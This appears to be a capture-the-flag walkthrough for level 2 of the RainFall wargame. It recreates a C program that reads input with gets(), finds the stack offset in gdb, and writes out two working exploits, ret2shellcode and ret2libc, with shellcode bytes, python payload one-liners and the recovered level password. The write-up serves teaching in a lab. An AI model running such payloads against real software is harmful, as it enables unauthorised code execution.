# Level 2

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void p(void)
{
    fflush(stdout);

    int buffer[16];
    gets(buffer);

    int tmp = buffer[20];
    if ((tmp & 0xb0000000) == 0xb0000000)
    {
        printf("(%p)\n", tmp);
        exit(1);
    }
    puts(buffer);
    strdup(buffer);
}

int main(void)
{
    p();
}
```

Let's focus on the `p` function. It reads input using the `gets` function, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes read. This will allow us to overflow the buffer and overwrite the return address of the `p` function.

Let's analyze the stack layout of our program:
```bash
(gdb) b *p+105 # Breaking before leave
Breakpoint 1 at 0x804853d

(gdb) r # Run the program
Starting program: /home/user/level2/level2


Breakpoint 1, 0x0804853d in p ()

(gdb) info registers # Check esp and ebp addresses
[...]
esp            0xbffff6c0       0xbffff6c0
ebp            0xbffff728       0xbffff728
[...]
```

By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 104 bytes:
```
0xbffff728 - 0xbffff6c0 = 68 (104 in decimal)
```	

Furthermore, we can see that our buffer is located at `-0x4c(%ebp),%eax`. Since our buffer is located at `ebp - 76`, we only have to write 76 bytes before reaching `ebp`.
> In this case we don't have to take the bytes between `esp` and `ebp` into account because the offset of our buffer is relative to `ebp`. `ebp` is the base pointer, whom's value is set at the beginning of the function. So the offset of our buffer will always be the same. Whereas `esp` is the stack pointer, whom's value changes during the execution of the program.

Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 80 bytes (76 + 4).

Anything written beyond those 80 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.

There's different ways to solve this challenge, we'll see two of them. First with a ret2shellcode and then the ret2libc way.

### Ret2Shellcode
Check the [level1's walkthrough](../level1/walkthrough.md#ret2shellcode) for an explanation of the ret2shellcode technique.

To redirect the execution, after the buffer overflow, we need an address. We use `ltrace` to find that `strdup` returns to `0x0804a008`.

```bash
level2@RainFall:~$ ltrace ./level2
[...]
strdup("") = 0x0804a008
```

Since `strdup` allocates the buffer that was read by `gets`, the address of the shellcode will be stored at `0x0804a008` (The address that was returned by strdup).

So our payload will be:
```
shellcode + padding + address of shellcode
Alternatively, you could place the padding before the shellcode, using NOPs.

"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\x04\xa0\x08"[::-1]
```

The padding is 80 - 21 because the shellcode is 21 bytes long.

Alright let's try it:
```bash
level2@RainFall:~$ (python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\x04\xa0\x08"[::-1])' && echo 'cat /home/user/level3/.pass') | ./level2
j
 X�Rh//shh/bin��1�̀������������������������������������������������������
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Perfect, let's move to the other solution.

### Ret2Libc
Check the [level1's walkthrough](../level1/walkthrough.md#ret2libc) for an explanation of the ret2libc technique.

We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:

```bash
# System
(gdb) info function system
0xb7e6b060  __libc_system
0xb7e6b060  system

# Exit
(gdb) info functions exit
0x080483d0  _exit
0x080483d0  _exit@plt

# /bin/sh
(gdb) info proc mappings
[...]
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
[...]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```

However we'll need to include an extra step because of the following lines:
```c
if ((tmp & 0xb0000000) == 0xb0000000)
{
    printf("(%p)\n", tmp);
    exit(1);
}
```

Ealier, I mentionned that the return address was put into our next variable, which is `tmp`. So the `&` operator, along with the `0xb0000000` mask is used to check if our return address most significant byte is equal to `0xb`. If it is, the program will exit. So we need to find an address that doesn't start with `0xb`. 

Given that the address of the `system` function begins with `0xb`, it cannot be directly used. So we'll have to include the address of a `ret` instruction in our payload. When the program attempts to return to this address, the `ret` instruction pops the address of `system` into the EIP register, causing the program to jump to `system`.


Alright, let's craft our payload:
```
reminder: padding + address of ret + address of system + address of exit + address of "/bin/sh"

"\x90"*80 + "\x08\x04\x85\x3e" + "\xb7\xe6\xb0\x60" + "\x08\x04\x83\xd0" + "\xb7\xf8\xcc\x58"
```

Let's run it:
```bash
level2@RainFall:~$ (python -c 'print("\x90"*80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\x08\x04\x83\xd0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])' && echo 'cat /home/user/level3/.pass') | ./level2
����������������������������������������������������������������>������������>`��X���
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

We are now level3! Let's move on to the next level.
